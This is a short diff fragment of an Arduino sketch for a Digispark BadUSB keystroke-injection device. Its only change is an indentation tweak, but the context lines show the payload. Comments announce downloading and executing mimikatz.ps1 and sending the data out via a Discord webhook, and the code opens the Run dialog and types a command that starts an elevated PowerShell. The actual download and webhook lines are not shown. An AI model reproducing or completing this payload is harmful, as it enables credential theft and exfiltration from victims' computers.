@@ -8,7 +8,7 @@ void loop() {
 	DigiKeyboard.sendKeyStroke(0);
 	// Download and Execute mimikatz.ps1
 	// send data via discord webhook
-    DigiKeyboard.delay(500);
+   DigiKeyboard.delay(500);
 	DigiKeyboard.sendKeyStroke(KEY_R,MOD_GUI_LEFT);
 	DigiKeyboard.delay(500);
 	DigiKeyboard.print("powershell -Noprofile \"Start-Process powershell -verb runas\"");
